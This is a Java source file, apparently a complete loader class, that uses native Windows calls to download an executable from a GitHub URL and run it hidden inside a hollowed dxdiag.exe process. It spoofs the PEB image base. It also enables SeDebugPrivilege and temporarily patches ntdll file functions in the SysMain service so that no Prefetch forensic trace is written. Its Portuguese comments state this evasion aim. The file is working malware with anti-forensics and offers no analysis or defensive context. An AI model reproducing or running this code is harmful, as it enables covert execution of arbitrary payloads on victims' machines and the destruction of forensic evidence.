    public static void Load(byte[] buffer, String host) throws Throwable {
        try (Arena arena = Arena.ofConfined()) {
            ByteBuffer bb = ByteBuffer.wrap(buffer).order(ByteOrder.LITTLE_ENDIAN);

            int   e_lfanew         = bb.getInt(0x3C);
            int   sizeOfImage      = bb.getInt(e_lfanew + 0x18 + 0x38);
            int   sizeOfHeaders    = bb.getInt(e_lfanew + 0x18 + 0x3C);
            int   entryPoint       = bb.getInt(e_lfanew + 0x18 + 0x10);
            short numberOfSections = bb.getShort(e_lfanew + 0x4 + 0x2);
            short sizeOfOptHdr     = bb.getShort(e_lfanew + 0x4 + 0x10);
            long  imageBase        = bb.getLong(e_lfanew + 0x18 + 0x18);

            MemorySegment si = arena.allocate(0x68);
            si.set(ValueLayout.JAVA_INT, 0, 0x68);
            MemorySegment pi = arena.allocate(0x18);

            byte[] cmdBytes = (host + "\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
            MemorySegment cmdSeg = arena.allocate(cmdBytes.length);
            cmdSeg.copyFrom(MemorySegment.ofArray(cmdBytes));

            int ok = (int) createProcess.invokeExact(
                MemorySegment.NULL, cmdSeg,
                MemorySegment.NULL, MemorySegment.NULL,
                false, 0x00000004 | 0x08000000,
                MemorySegment.NULL, MemorySegment.NULL,
                si, pi);

            if (ok == 0) return;

            MemorySegment hProcess = MemorySegment.ofAddress(pi.get(ValueLayout.JAVA_LONG, 0x0));
            MemorySegment hThread  = MemorySegment.ofAddress(pi.get(ValueLayout.JAVA_LONG, 0x8));

            int unmap = (int) zwUnmapViewOfSection.invokeExact(hProcess, MemorySegment.ofAddress(imageBase));

            MemorySegment remote = (MemorySegment) virtualAllocEx.invokeExact(
                hProcess, MemorySegment.ofAddress(imageBase),
                (long) sizeOfImage, 0x3000, 0x04);
            if (remote.address() == 0) return;

            MemorySegment hdrSeg = arena.allocate(sizeOfHeaders);
            hdrSeg.copyFrom(MemorySegment.ofArray(Arrays.copyOf(buffer, sizeOfHeaders)));
            int w1 = (int) writeProcessMemory.invokeExact(hProcess, MemorySegment.ofAddress(imageBase),
                hdrSeg, (long) sizeOfHeaders, MemorySegment.NULL);

            for (short i = 0; i < numberOfSections; i++) {
                int secOff         = e_lfanew + (0x18 + sizeOfOptHdr) + (0x28 * i);
                int virtualAddress = bb.getInt(secOff + 0x0C);
                int sizeOfRawData  = bb.getInt(secOff + 0x10);
                int ptrToRawData   = bb.getInt(secOff + 0x14);
                if (sizeOfRawData <= 0 || ptrToRawData + sizeOfRawData > buffer.length) continue;
                byte[] sec = Arrays.copyOfRange(buffer, ptrToRawData, ptrToRawData + sizeOfRawData);
                MemorySegment secSeg = arena.allocate(sec.length);
                secSeg.copyFrom(MemorySegment.ofArray(sec));
                int ws = (int) writeProcessMemory.invokeExact(hProcess,
                    MemorySegment.ofAddress(imageBase + virtualAddress),
                    secSeg, (long) sec.length, MemorySegment.NULL);
            }

            MemorySegment ctx = arena.allocate(0x4d0);
            ctx.set(ValueLayout.JAVA_INT, 0x30, 0x0010001B);
            int gtc = (int) getThreadContext.invokeExact(hThread, ctx);
            long rdx = ctx.get(ValueLayout.JAVA_LONG, 0x88);

            if (rdx != 0) {
                MemorySegment ibSeg = arena.allocate(8);
                ibSeg.set(ValueLayout.JAVA_LONG, 0, imageBase);
                int wpeb = (int) writeProcessMemory.invokeExact(hProcess,
                    MemorySegment.ofAddress(rdx + 16), ibSeg, 8L, MemorySegment.NULL);
            }

            ctx.set(ValueLayout.JAVA_LONG, 0x80, imageBase + entryPoint);
            int stc = (int) setThreadContext.invokeExact(hThread, ctx);

            MemorySegment oldProt = arena.allocate(ValueLayout.JAVA_INT);
            for (short i = 0; i < numberOfSections; i++) {
                int secOff          = e_lfanew + (0x18 + sizeOfOptHdr) + (0x28 * i);
                int virtualAddress  = bb.getInt(secOff + 0x0C);
                int virtualSize     = bb.getInt(secOff + 0x08);
                int characteristics = bb.getInt(secOff + 0x24);
                int prot = 0x02;
                if ((characteristics & 0x20000000) != 0)      prot = 0x20;
                else if ((characteristics & 0x80000000) != 0) prot = 0x04;
                try {
                    int vp = (int) virtualProtectEx.invokeExact(hProcess,
                        MemorySegment.ofAddress(imageBase + virtualAddress),
                        (long) virtualSize, prot, oldProt);
                } catch (Throwable ignored) {}
            }

            if (rdx != 0) {
                try {
                    MemorySegment origBase = arena.allocate(8);
                    origBase.set(ValueLayout.JAVA_LONG, 0, 0x140000000L);
                    int spoof = (int) writeProcessMemory.invokeExact(hProcess,
                        MemorySegment.ofAddress(rdx + 16), origBase, 8L, MemorySegment.NULL);
                } catch (Throwable ignored) {}
            }

            int rt = (int) resumeThread.invokeExact(hThread);

            System.out.println("Ready..");
            Thread.sleep(2000);
        }
    }

    static void writeRemote(MemorySegment hProc, long addr, byte[] data, Arena arena) throws Throwable {
        MemorySegment dataSeg = arena.allocate(data.length);
        dataSeg.copyFrom(MemorySegment.ofArray(data));
        MemorySegment addrSeg = MemorySegment.ofAddress(addr);
        MemorySegment oldProt = arena.allocate(ValueLayout.JAVA_INT);
        int p1 = (int) virtualProtectEx.invokeExact(hProc, addrSeg, (long) data.length, 0x40, oldProt);
        int w  = (int) writeProcessMemory.invokeExact(hProc, addrSeg, dataSeg, (long) data.length, MemorySegment.NULL);
        int p2 = (int) virtualProtectEx.invokeExact(hProc, addrSeg, (long) data.length, oldProt.get(ValueLayout.JAVA_INT, 0), oldProt);
        int f  = (int) flushInstructionCache.invokeExact(hProc, addrSeg, (long) data.length);
    }

    static byte[] readRemote(MemorySegment hProc, long addr, int size, Arena arena) throws Throwable {
        MemorySegment buf = arena.allocate(size);
        MemorySegment rd  = arena.allocate(ValueLayout.JAVA_LONG);
        int ok = (int) readProcessMemory.invokeExact(hProc, MemorySegment.ofAddress(addr), buf, (long) size, rd);
        if (ok == 0) return null;
        byte[] out = new byte[size];
        for (int i = 0; i < size; i++) out[i] = buf.get(ValueLayout.JAVA_BYTE, i);
        return out;
    }

    static long getRemoteFuncAddr(int pid, String dll, String func, Arena arena) throws Throwable {
        byte[] dllB = (dll + "\0").getBytes();
        MemorySegment dllSeg = arena.allocate(dllB.length);
        dllSeg.copyFrom(MemorySegment.ofArray(dllB));
        MemorySegment hLocal = (MemorySegment) getModuleHandle.invokeExact(dllSeg);
        if (hLocal.address() == 0) hLocal = (MemorySegment) loadLibrary.invokeExact(dllSeg);
        if (hLocal.address() == 0) return 0;
        byte[] funcB = (func + "\0").getBytes();
        MemorySegment funcSeg = arena.allocate(funcB.length);
        funcSeg.copyFrom(MemorySegment.ofArray(funcB));
        MemorySegment localAddr = (MemorySegment) getProcAddress.invokeExact(hLocal, funcSeg);
        if (localAddr.address() == 0) return 0;
        long offset = localAddr.address() - hLocal.address();
        MemorySegment hSnap = (MemorySegment) createToolhelp32Snapshot.invokeExact(0x00000008 | 0x00000010, pid);
        if (hSnap.address() == 0 || hSnap.address() == -1L) return 0;
        try {
            // MODULEENTRY32W = 1080 bytes no x64; dwSize@0, modBaseAddr@24, szModule[256]@48
            MemorySegment me = arena.allocate(1080, 8);
            me.set(ValueLayout.JAVA_INT, 0, 1080);
            int ok = (int) module32First.invokeExact(hSnap, me);
            while (ok != 0) {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 256; i++) {
                    char c = me.get(ValueLayout.JAVA_CHAR, 48 + (long) i * 2);
                    if (c == 0) break;
                    sb.append(c);
                }
                if (sb.toString().equalsIgnoreCase(dll)) {
                    long base = me.get(ValueLayout.JAVA_LONG, 24);
                    return base + offset;
                }
                ok = (int) module32Next.invokeExact(hSnap, me);
            }
            return 0;
        } finally {
            int ch = (int) closeHandle.invokeExact(hSnap);
        }
    }

    static void SysmainPatch() throws Throwable {
        boolean priv = enableDebugPrivilege();
        try (Arena arena = Arena.ofConfined()) {
            MemorySegment hSCM = (MemorySegment) openSCManager.invokeExact(MemorySegment.NULL, MemorySegment.NULL, 0x0004);
            if (hSCM.address() == 0) {
                return;
            }
            byte[] svcB = "SysMain\0".getBytes();
            MemorySegment svcSeg = arena.allocate(svcB.length);
            svcSeg.copyFrom(MemorySegment.ofArray(svcB));
            MemorySegment hSvc = (MemorySegment) openService.invokeExact(hSCM, svcSeg, 0x0004);
            if (hSvc.address() == 0) {
                int c1 = (int) closeServiceHandle.invokeExact(hSCM);
                return;
            }
            MemorySegment ssp = arena.allocate(40, 4);
            MemorySegment needed = arena.allocate(ValueLayout.JAVA_INT);
            int qok = (int) queryServiceStatusEx.invokeExact(hSvc, 0, ssp, 40, needed);
            int pid = ssp.get(ValueLayout.JAVA_INT, 28);
            int c2 = (int) closeServiceHandle.invokeExact(hSvc);
            int c3 = (int) closeServiceHandle.invokeExact(hSCM);
            if (pid == 0) return;
            MemorySegment hProc = (MemorySegment) openProcess.invokeExact(0x0438, false, pid);
            if (hProc.address() == 0) {
                return;
            }
            byte[] vacPatch = {(byte) 0x48, (byte) 0xC7, (byte) 0xC0, (byte) 0xA2, (byte) 0x00, (byte) 0x00, (byte) 0xC0, (byte) 0xC3};
            String[] funcs = {"NtCreateFile", "NtOpenFile", "NtWriteFile"};
            long[] addrs = new long[funcs.length];
            byte[][] origs = new byte[funcs.length][];
            for (int i = 0; i < funcs.length; i++) {
                addrs[i] = getRemoteFuncAddr(pid, "ntdll.dll", funcs[i], arena);
                if (addrs[i] == 0) continue;
                origs[i] = readRemote(hProc, addrs[i], vacPatch.length, arena);
                if (origs[i] == null) { addrs[i] = 0; continue; }
            }
            for (int i = 0; i < funcs.length; i++) {
                if (addrs[i] == 0 || origs[i] == null) continue;
                writeRemote(hProc, addrs[i], vacPatch, arena);
            }
            sysApplied = true;
            Thread.sleep(23000);
            for (int i = 0; i < funcs.length; i++) {
                if (addrs[i] == 0 || origs[i] == null) continue;
                writeRemote(hProc, addrs[i], origs[i], arena);
            }
            int ch = (int) closeHandle.invokeExact(hProc);
        }
    }

    public static void main(String[] args) throws Throwable {
        try {
            // 1. PRIMEIRO DE TUDO: SysMain (janela de 23s sem Prefetch) em paralelo
            Thread patchThread = new Thread(() -> {
                try {
                    SysmainPatch();
                } catch (Throwable t) {
                }
            });
            patchThread.start();

            // Espera o patch ativar antes de injetar
            for (int i = 0; i < 100 && !sysApplied && patchThread.isAlive(); i++) Thread.sleep(100);

            // 2. DEPOIS: inject hollow normal
            String url  = "https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/MixCodes.exe";
            String file = "C:\\Windows\\System32\\dxdiag.exe";

            byte[] payload = downloadFile(url);
            Load(payload, file);

            // Sai DENTRO da janela: sem .pf proprio (o restore fica p/ o reboot)
            System.exit(0);

            // 3. Volta automatico: espera a janela fechar (restore) antes de sair
            patchThread.join();
        } catch (Throwable t) {
        }
    }

    static boolean enableDebugPrivilege() {
        try (Arena arena = Arena.ofConfined()) {
            MemorySegment hToken = arena.allocate(ValueLayout.ADDRESS);
            MemorySegment hProc  = (MemorySegment) getCurrentProcess.invokeExact();
            int otp = (int) openProcessToken.invokeExact(hProc, 0x0028, hToken);
            if (otp == 0) {
                return false;
            }
            MemorySegment tok = hToken.get(ValueLayout.ADDRESS, 0);
            try {
                // 1. Elevacao do token (TokenElevation=20)
                MemorySegment elev = arena.allocate(ValueLayout.JAVA_INT);
                MemorySegment elevLen = arena.allocate(ValueLayout.JAVA_INT);
                int gel = (int) getTokenInformation.invokeExact(tok, 20, elev, 4, elevLen);

                // 2. LUID do SeDebugPrivilege
                byte[] nameB = ("SeDebugPrivilege\0").getBytes(java.nio.charset.StandardCharsets.UTF_16LE);
                MemorySegment nameSeg = arena.allocate(nameB.length);
                nameSeg.copyFrom(MemorySegment.ofArray(nameB));
                MemorySegment luid = arena.allocate(8);
                int lpv = (int) lookupPrivilegeValue.invokeExact(MemorySegment.NULL, nameSeg, luid);
                long luidVal = luid.get(ValueLayout.JAVA_LONG, 0);
                if (lpv == 0) return false;

                // 3. Lista privilegios do token (TokenPrivileges=3) e procura SeDebug
                MemorySegment needLen = arena.allocate(ValueLayout.JAVA_INT);
                int q1 = (int) getTokenInformation.invokeExact(tok, 3, MemorySegment.NULL, 0, needLen);
                int privSize = needLen.get(ValueLayout.JAVA_INT, 0);
                boolean found = false;
                int foundAttrs = 0;
                if (privSize > 4) {
                    MemorySegment tpBuf = arena.allocate(privSize, 4);
                    MemorySegment retLen = arena.allocate(ValueLayout.JAVA_INT);
                    int q2 = (int) getTokenInformation.invokeExact(tok, 3, tpBuf, privSize, retLen);
                    if (q2 != 0) {
                        int count = tpBuf.get(ValueLayout.JAVA_INT, 0);
                        for (int i = 0; i < count; i++) {
                            // LUID_AND_ATTRIBUTES: LowPart@+0(INT) HighPart@+4(INT) Attrs@+8(INT)
                            // (leitura por INT: o buffer tem alinhamento 4, JAVA_LONG quebraria)
                            long off = 4 + (long) i * 12;
                            int low = tpBuf.get(ValueLayout.JAVA_INT, off);
                            int high = tpBuf.get(ValueLayout.JAVA_INT, off + 4);
                            long eLuid = (((long) high) << 32) | (low & 0xFFFFFFFFL);
                            int attrs = tpBuf.get(ValueLayout.JAVA_INT, off + 8);
                            if (eLuid == luidVal) {
                                found = true;
                                foundAttrs = attrs;
                            }
                        }
                    }
                }

                // 4. Tenta habilitar (por INT: LONG no offset 4 = Misaligned)
                MemorySegment tp = arena.allocate(16);
                tp.set(ValueLayout.JAVA_INT,  0,  1);
                tp.set(ValueLayout.JAVA_INT,  4,  (int) (luidVal & 0xFFFFFFFFL));
                tp.set(ValueLayout.JAVA_INT,  8,  (int) (luidVal >>> 32));
                tp.set(ValueLayout.JAVA_INT,  12, 0x00000002);
                int adj = (int) adjustTokenPrivileges.invokeExact(tok, 0, tp, 0, MemorySegment.NULL, MemorySegment.NULL);
                int gle2 = (int) getLastError.invokeExact();
                return gle2 == 0;
            } finally {
                int ch = (int) closeHandle.invokeExact(tok);
            }
        } catch (Throwable t) {
            return false;
        }
    }

    static byte[] downloadFile(String url) throws Exception {
        HttpClient client = HttpClient.newBuilder()
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();
        HttpRequest req = HttpRequest.newBuilder()
            .uri(URI.create(url))
            .header("User-Agent", "Mozilla/5.0")
            .GET().build();
        HttpResponse<byte[]> resp = client.send(req, HttpResponse.BodyHandlers.ofByteArray());
        if (resp.statusCode() != 200) throw new RuntimeException("HTTP " + resp.statusCode());
        return resp.body();
    }
}
